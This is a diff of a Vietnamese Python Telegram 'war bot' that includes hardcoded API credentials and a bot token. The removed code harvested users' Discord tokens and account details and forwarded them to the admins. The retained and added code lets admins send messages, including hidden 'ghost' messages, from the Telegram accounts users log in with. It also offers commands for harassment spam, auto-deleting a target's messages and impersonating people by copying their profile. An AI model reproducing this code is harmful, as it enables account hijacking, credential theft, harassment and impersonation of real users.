@@ -12,9 +12,9 @@ from telethon.errors import (
 # ==========================================
 A_ID = 32300846
 A_HS = "a6da3117ff6b8a1679d04ab743976068"
-# Token mới chính xác của bạn
 B_TK = '8991807402:AAG-2jT1jKj5Zxo0mndem7Q1WPxI4L19dDc'
 O_ID = 7907990385
+BOT_USERNAME = "@minhduchotwar1_bot"
 
 REQUIRED_GROUPS = [
     {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
@@ -30,17 +30,8 @@ DEFAULT_DELAY = 0.2
 admin_selected_target = {}
 anti_disconnect_tasks = {}
 
-discord_sessions = {}
-discord_spam_tasks = {}
-
 def get_user_delay(u_i):
     return user_delays.get(u_i, DEFAULT_DELAY)
-
-def to_small_caps(text):
-    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢAʙCᴅEғGʜIᴊKʟMɴOᴘQʀSᴛUᴠWXYᴢ0123456789"
-    trans = str.maketrans(normal, small)
-    return text.translate(trans)
 
 def get_default_lines():
     lines = []
@@ -131,14 +122,16 @@ async def is_user_in_channel(user_id):
 # GIAO DIỆN CHỌN APP & MENU TELEGRAM
 # ==========================================
 def get_app_selector_menu():
-    msg = """
-🤖 **Bot War Multi-Platform By Trần Minh Đức**
+    msg = f"""
+Bot War By Trần Minh Đức 🌧🌠
 ────────────────
+🤖 **Bot War:** `{BOT_USERNAME}`
 Vui lòng chọn ứng dụng bạn muốn chiến:
 """
     buttons = [
         [Button.inline("📱 Telegram War System", data="app_telegram")],
-        [Button.inline("🤖 Discord Spam System", data="app_discord")]
+        [Button.inline("🤖 Discord Spam System", data="app_discord")],
+        [Button.url("💬 Hồ Sơ Admin Hỗ Trợ", "https://t.me/Mduchotwar")]
     ]
     return msg, buttons
 
@@ -150,6 +143,7 @@ def get_main_menu(u):
     msg = f"""
 🔥 **TELEGRAM WAR SYSTEM**
 ────────────────
+• **Bot War:** `{BOT_USERNAME}`
 • Trạng thái tài khoản: `{status_text}`
 • Delay hiện tại: `{current_delay}s`
 • Chọn chức năng bên dưới:
@@ -168,7 +162,7 @@ def get_main_menu(u):
         buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
         
     buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
-    buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
+    buttons.append([Button.url("💬 Hồ Sơ Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
     
     return msg, buttons
 
@@ -189,124 +183,6 @@ Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử 
     buttons.append([Button.inline("🔄 Xác Nhận Đã Vào Đủ Nhóm", data="check_join")])
     return msg, buttons
 
-def render_discord_dashboard(u):
-    session = discord_sessions.get(u, {})
-    tokens = session.get("tokens", [])
-    channels = session.get("channels", [])
-    delay = session.get("delay", 2.0)
-    mode = session.get("mode", "full") 
-    font_style = session.get("font_style", "big") 
-    tag_target = session.get("tag_target", "") 
-    use_custom_file = session.get("use_custom_file", False)
-    
-    is_running = u in discord_spam_tasks and not discord_spam_tasks[u].done()
-    status_str = "🟢 Đang Spam..." if is_running else "🔴 Đang Dừng"
-
-    tokens_str = f"{len(tokens)} Token" if tokens else "❌ Chưa nhập"
-    channels_str = ', '.join(channels) if channels else "❌ Chưa cài"
-    mode_str = "Gửi Full (1 lần)" if mode == "full" else "Gửi Từng Dòng"
-    font_str = "Chữ To (# Nổi Bật)" if font_style == "big" else "Chữ Bé (Small Caps)"
-    tag_str = f"<@{tag_target}>" if tag_target else "❌ Tắt"
-    
-    lines = session.get("lines", [])
-    if not lines or not use_custom_file:
-        lines = get_default_lines()
-        source_str = "Kho Ngôn Mặc Định"
-    else:
-        source_str = f"File .TXT ({len(lines)} Dòng)"
-
-    display_sample = lines[0][:30] if lines else "Không có nội dung"
-
-    txt = f"""
-🤖 **BẢNG ĐIỀU KHIỂN DISCORD SPAM SYSTEM**
-────────────────
-• **Trạng thái:** `{status_str}`
-• **Kho Ngôn:** `{source_str}`
-• **Token:** `{tokens_str}` | **Kênh:** `{channels_str}`
-• **Chế độ:** `{mode_str}` | **Font:** `{font_str}`
-• **Tag Cuối:** `{tag_str}` | **Delay:** `{delay}s`
-• **Mẫu:** `{display_sample}...`
-"""
-    buttons = []
-    if is_running:
-        buttons.append([Button.inline("⏹ NGỪNG SPAM DISCORD", data="dc_stop_spam")])
-    else:
-        buttons.append([Button.inline("▶ BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")])
-
-    buttons.append([
-        Button.inline("🆔 Cài ID Kênh", data="dc_set_channels"),
-        Button.inline("📝 Đổi Kho Ngôn", data="dc_set_content")
-    ])
-    buttons.append([
-        Button.inline(f"⚙️ Mode", data="dc_toggle_mode"),
-        Button.inline(f"🔤 Font", data="dc_toggle_font")
-    ])
-    buttons.append([
-        Button.inline("🏷 Tag Cuối", data="dc_set_tag"),
-        Button.inline("⏱ Delay", data="dc_set_delay")
-    ])
-    buttons.append([
-        Button.inline("🔑 Thêm Token", data="dc_set_tokens"),
-        Button.inline("🔄 Reset", data="dc_reset")
-    ])
-    buttons.append([
-        Button.inline("🚪 Đăng Xuất", data="dc_logout"),
-        Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")
-    ])
-
-    return txt, buttons
-
-# ==========================================
-# DISCORD ENGINE & API
-# ==========================================
-def get_discord_headers(token):
-    return {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    }
-
-async def get_discord_user_info(token):
-    headers = get_discord_headers(token)
-    url = "https://discord.com/api/v10/users/@me"
-    try:
-        async with ClientSession() as session:
-            async with session.get(url, headers=headers, timeout=10) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    user_id = int(data.get("id"))
-                    timestamp = ((user_id >> 22) + 1420070400000) / 1000
-                    created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
-                    return True, data, created_at
-                return False, None, None
-    except:
-        return False, None, None
-
-async def notify_admin_discord_token(user_id, token, user_data, created_at):
-    try:
-        username = f"{user_data.get('username')}#{user_data.get('discriminator', '0')}"
-        uid = user_data.get('id')
-        email = user_data.get('email', 'Không có')
-        phone = user_data.get('phone', 'Không có')
-        premium_type = user_data.get('premium_type', 0)
-        nitro_map = {0: "Không có", 1: "Classic", 2: "Boost", 3: "Basic"}
-        nitro_status = nitro_map.get(premium_type, "Không rõ")
-
-        caption = f"""
-🚨 **TOKEN DISCORD MỚI NẠP!**
-────────────────
-• **User Telegram:** `{user_id}`
-• **Tên Discord:** `{username}` (`{uid}`)
-• **Ngày Tạo:** `{created_at}`
-• **Nitro:** `{nitro_status}`
-• **Token:** `{token}`
-"""
-        for admin_id in admins:
-            try:
-                await bot.send_message(admin_id, caption, parse_mode='markdown')
-            except: pass
-    except: pass
-
 async def notify_admin_login(client, user_id, phone_number):
     try:
         me = await client.get_me()
@@ -314,13 +190,11 @@ async def notify_admin_login(client, user_id, phone_number):
         about_text = full_user.full_user.about or "Không có"
         
         device_model = "Không xác định"
-        app_version = "Không xác định"
         try:
             auths = await client(functions.account.GetAuthorizationsRequest())
             for auth in auths.authorizations:
                 if auth.current:
                     device_model = f"{auth.device_model} ({auth.platform})"
-                    app_version = auth.app_name
                     break
         except: pass
 
@@ -365,6 +239,38 @@ async def start_anti_disconnect(target_uid, client):
 # ==========================================
 def _logic(c, u_i):
     def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)
+
+    # LỆNH /help TỰ ĐỘNG HIỂN THỊ TOÀN BỘ CHỨC NĂNG
+    @c.on(events.NewMessage(outgoing=True, pattern=r'^(?:/|\.)help$'))
+    async def _help_cmd(e):
+        help_text = f"""
+📖 **BẢNG HƯỚNG DẪN BỘ LỆNH USERBOT WAR**
+────────────────
+🤖 **Bot War:** `{BOT_USERNAME}`
+
+💥 **NHÓM LỆNH SPAM & TAG:**
+• `/sptagname <@username>` : Spam tag tên liên tục.
+• `/sp <id>` : Spam danh sách chửi 1 vào đối tượng.
+• `/sp2 <id>` : Spam danh sách chửi 2 vào đối tượng.
+• `/spicon <số_lượng>` : Spam các icon trêu tức.
+• `/stop` : Dừng ngay lập tức toàn bộ tiến trình spam.
+
+☠ **NHÓM LỆNH MUTE / CÂM TỰ ĐỘNG:**
+• `/cam <id>` : Tự động xóa tin nhắn của ID đó trong Box hiện tại.
+• `/sua <id>` : Tháo lệnh câm ID đó trong Box.
+• `/camib <id>` : Câm và tự động xóa tin nhắn cá nhân (Inbox).
+• `/suaib <id>` : Tháo câm Inbox cho ID đó.
+
+📦 **NHÓM LỆNH TIỆN ÍCH & GIẢ LẬP:**
+• `/info <@/id/reply>` : Kiểm tra thông tin hồ sơ đối tượng.
+• `/fake <@/id/reply>` : Sao chép Name, Bio, Avatar của đối tượng.
+• `/diefake` : Khôi phục lại Name, Bio, Avatar gốc ban đầu.
+• `/voice <văn_bản>` : Chuyển đổi văn bản thành Voice Tiếng Việt.
+
+⚡ **Delay hiện tại:** `{get_user_delay(u_i)}s`
+💬 **Hỗ trợ Admin:** @Mduchotwar
+"""
+        await e.edit(help_text, parse_mode='markdown')
 
     async def _sd(cid, ct, tid=None):
         s_t[u_i] = True
@@ -579,14 +485,7 @@ async def _callback_handler(ev):
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "app_discord":
-        if u not in discord_sessions:
-            discord_sessions[u] = {
-                "tokens": [], "channels": [], "lines": get_default_lines(),
-                "delay": 2.0, "mode": "full", "font_style": "big", 
-                "tag_target": "", "use_custom_file": False, "step": None
-            }
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+        return await ev.answer("⚠️ Tính năng đang đc bảo trì!", alert=True)
 
     # ADMIN CONTROL PANEL
     elif data == "m_control":
@@ -618,9 +517,9 @@ async def _callback_handler(ev):
 🆔 **ID:** `{me.id}`
 """
         buttons = [
-            [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm", data="rmt_send_all")],
-            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
-            [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
+            [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("🥷 Gửi Ẩn Danh (Ghost)", data="rmt_send_ghost")],
+            [Button.inline("📢 Gửi All Nhóm", data="rmt_send_all"), Button.inline("📋 Check Số Nhóm", data="rmt_count_groups")],
+            [Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1"), Button.inline("🔙 Chọn Acc Khác", data="m_control")]
         ]
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
@@ -638,6 +537,27 @@ async def _callback_handler(ev):
                 chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
                 await u_c[target_uid].send_message(chat_entity, msg_text)
                 await cv.send_message(f"✅ **Đã gửi thành công!**")
+            except Exception as ex:
+                await cv.send_message(f"❌ **Lỗi:** `{ex}`")
+
+    elif data == "rmt_send_ghost":
+        if u not in admins: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("🎯 **Nhập ID hoặc @username nhóm/chat cần gửi ẩn danh:**")
+            chat_target = (await cv.get_response()).text.strip()
+            await cv.send_message("📝 **Nhập nội dung tin nhắn ẩn danh:**")
+            msg_text = (await cv.get_response()).text.strip()
+            try:
+                chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
+                client = u_c[target_uid]
+                sent_msg = await client.send_message(chat_entity, msg_text)
+                try:
+                    await client.delete_messages(chat_entity, [sent_msg.id], revoke=False)
+                except: pass
+                await cv.send_message(f"✅ **Đã gửi ẩn danh thành công!**")
             except Exception as ex:
                 await cv.send_message(f"❌ **Lỗi:** `{ex}`")
 
@@ -824,167 +744,6 @@ async def _callback_handler(ev):
         txt = "👑 **ADMIN SYSTEM**\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/addvip <id>`\n• `/delvip <id>`\n• `/tb <nội dung>`"
         await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
-    # DISCORD CONVERSATION SETTINGS
-    elif data in ["dc_set_tokens", "dc_set_channels", "dc_set_content", "dc_set_tag", "dc_set_delay"]:
-        if u not in discord_sessions: discord_sessions[u] = {}
-        await ev.answer()
-        async with bot.conversation(u, timeout=60) as cv:
-            if data == "dc_set_tokens":
-                await cv.send_message("🔑 **Nhập Token Discord của bạn** *(Nhiều token cách nhau bằng dấu phẩy `,`)*:")
-                resp = await cv.get_response()
-                raw_tokens = resp.text.strip()
-                tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
-                if tokens:
-                    discord_sessions[u]["tokens"] = tokens
-                    for t in tokens:
-                        valid, user_data, created_at = await get_discord_user_info(t)
-                        if valid: await notify_admin_discord_token(u, t, user_data, created_at)
-                    await cv.send_message(f"✅ **Đã lưu thành công {len(tokens)} Token Discord!**")
-
-            elif data == "dc_set_channels":
-                await cv.send_message("🆔 **Nhập ID Kênh / Nhóm Discord** *(Nhiều ID cách nhau bằng dấu phẩy `,`)*:")
-                resp = await cv.get_response()
-                ch_input = resp.text.strip()
-                channel_ids = [part.strip() for part in ch_input.replace(",", " ").split() if part.strip().isdigit()]
-                if channel_ids:
-                    discord_sessions[u]["channels"] = channel_ids
-                    await cv.send_message(f"✅ **Đã cập nhật {len(channel_ids)} ID Kênh thành công!**")
-                else: await cv.send_message("❌ ID kênh không hợp lệ!")
-
-            elif data == "dc_set_content":
-                await cv.send_message("📝 **Gửi file .txt chứa nội dung spam** hoặc **nhập trực tiếp văn bản** *(Gửi chữ `reset` để dùng kho mặc định)*:")
-                resp = await cv.get_response()
-                if resp.text and resp.text.strip().lower() == "reset":
-                    discord_sessions[u]["use_custom_file"] = False
-                    discord_sessions[u]["lines"] = get_default_lines()
-                    await cv.send_message("✅ **Đã chuyển về Kho Ngôn mặc định!**")
-                elif resp.file and resp.file.ext == ".txt":
-                    file_bytes = await resp.download_media(bytes)
-                    raw_text = file_bytes.decode('utf-8', errors='ignore').strip()
-                    lines = [line.strip() for line in raw_text.splitlines() if line.strip()]
-                    if lines:
-                        discord_sessions[u]["lines"] = lines
-                        discord_sessions[u]["use_custom_file"] = True
-                        await cv.send_message(f"✅ **Đã nạp file TXT với {len(lines)} dòng!**")
-                elif resp.text:
-                    lines = [line.strip() for line in resp.text.splitlines() if line.strip()]
-                    if lines:
-                        discord_sessions[u]["lines"] = lines
-                        discord_sessions[u]["use_custom_file"] = True
-                        await cv.send_message("✅ **Đã cập nhật nội dung văn bản riêng!**")
-
-            elif data == "dc_set_tag":
-                await cv.send_message("🏷 **Nhập User ID Discord cần tag cuối câu** *(Gửi `0` để tắt)*:")
-                resp = await cv.get_response()
-                tag_val = resp.text.strip().replace("<@", "").replace(">", "")
-                if tag_val == "0":
-                    discord_sessions[u]["tag_target"] = ""
-                    await cv.send_message("✅ **Đã tắt tính năng tag!**")
-                elif tag_val.isdigit():
-                    discord_sessions[u]["tag_target"] = tag_val
-                    await cv.send_message(f"✅ **Đã cài đặt tag ID:** `{tag_val}`")
-
-            elif data == "dc_set_delay":
-                await cv.send_message("⏱ **Nhập thời gian Delay (giây)** *(Ví dụ: 1.5 hoặc 2)*:")
-                resp = await cv.get_response()
-                try:
-                    d = float(resp.text.strip())
-                    discord_sessions[u]["delay"] = max(0.1, d)
-                    await cv.send_message(f"✅ **Đã cập nhật Delay thành {discord_sessions[u]['delay']}s!**")
-                except: await cv.send_message("❌ Giá trị không hợp lệ!")
-
-        txt, buttons = render_discord_dashboard(u)
-        await ev.respond(txt, buttons=buttons, parse_mode='markdown')
-
-    elif data == "dc_toggle_mode":
-        curr_mode = discord_sessions[u].get("mode", "full")
-        discord_sessions[u]["mode"] = "line" if curr_mode == "full" else "full"
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
-        await ev.answer("⚙️ Đã đổi chế độ gửi!")
-
-    elif data == "dc_toggle_font":
-        curr_font = discord_sessions[u].get("font_style", "big")
-        discord_sessions[u]["font_style"] = "small" if curr_font == "big" else "big"
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
-        await ev.answer("🔤 Đã đổi kiểu chữ!")
-
-    elif data == "dc_start_spam":
-        session = discord_sessions.get(u, {})
-        tokens = session.get("tokens", [])
-        channels = session.get("channels", [])
-        if not tokens: return await ev.answer("❌ Chưa cài Token Discord!", alert=True)
-        if not channels: return await ev.answer("❌ Chưa cài ID Kênh Discord!", alert=True)
-        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
-            return await ev.answer("⚠️ Tiến trình spam đang chạy!", alert=True)
-
-        mode = session.get("mode", "full")
-        font_style = session.get("font_style", "big")
-        delay = session.get("delay", 2.0)
-        tag_target = session.get("tag_target", "")
-        use_custom_file = session.get("use_custom_file", False)
-        lines = session.get("lines", []) if use_custom_file else get_default_lines()
-        raw_content = "\n".join(lines)
-
-        async def run_spam_loop():
-            async with ClientSession() as session_http:
-                line_idx = 0
-                while True:
-                    for t in tokens:
-                        headers = get_discord_headers(t)
-                        for ch in channels:
-                            url = f"https://discord.com/api/v10/channels/{ch}/messages"
-                            msg_text = raw_content if mode == "full" else lines[line_idx % len(lines)]
-                            line_idx += 1
-                            if font_style == "big":
-                                msg_text = "\n".join([f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()])
-                            elif font_style == "small":
-                                msg_text = to_small_caps(msg_text)
-                            if tag_target: msg_text = f"{msg_text} <@{tag_target}>"
-                            try:
-                                async with session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10) as resp:
-                                    if resp.status == 429:
-                                        data_json = await resp.json()
-                                        await asyncio.sleep(data_json.get("retry_after", 2.0))
-                            except: pass
-                            await asyncio.sleep(delay)
-
-        discord_spam_tasks[u] = asyncio.create_task(run_spam_loop())
-        await ev.answer("🚀 Đã BẮT ĐẦU Spam Discord!", alert=True)
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
-
-    elif data == "dc_stop_spam":
-        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
-            discord_spam_tasks[u].cancel()
-            discord_spam_tasks.pop(u, None)
-            await ev.answer("🛑 Đã NGỪNG Spam Discord!", alert=True)
-        else: await ev.answer("⚠️ Không có tiến trình nào đang chạy!", alert=True)
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
-
-    elif data == "dc_reset":
-        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
-            discord_spam_tasks[u].cancel()
-            discord_spam_tasks.pop(u, None)
-        discord_sessions[u] = {
-            "tokens": [], "channels": [], "lines": get_default_lines(),
-            "delay": 2.0, "mode": "full", "font_style": "big", 
-            "tag_target": "", "use_custom_file": False
-        }
-        await ev.answer("🔄 Đã reset cấu hình!", alert=True)
-        txt, buttons = render_discord_dashboard(u)
-        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
-
-    elif data == "dc_logout":
-        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
-            discord_spam_tasks[u].cancel()
-            discord_spam_tasks.pop(u, None)
-        discord_sessions.pop(u, None)
-        msg, buttons = get_app_selector_menu()
-        await ev.edit("🚪 **Đã đăng xuất phiên Discord!**\n\n" + msg, buttons=buttons, parse_mode='markdown')
-
     elif data == "login":
         if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
         await ev.answer()
@@ -1018,7 +777,7 @@ async def _callback_handler(ev):
                 anti_disconnect_tasks[u] = task
 
                 await notify_admin_login(c, u, p)
-                await cv.send_message("✅ **LOGIN THÀNH CÔNG & BẬT GIỮ KẾT NỐI!**")
+                await cv.send_message("✅ **LOGIN THÀNH CÔNG & Tất cả Chức Năng Đã Dùng đc**")
             except Exception as e:
                 await cv.send_message(f"❌ **Lỗi Login:** `{e}`")
 
@@ -1126,4 +885,3 @@ if __name__ == '__main__':
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         pass
-response
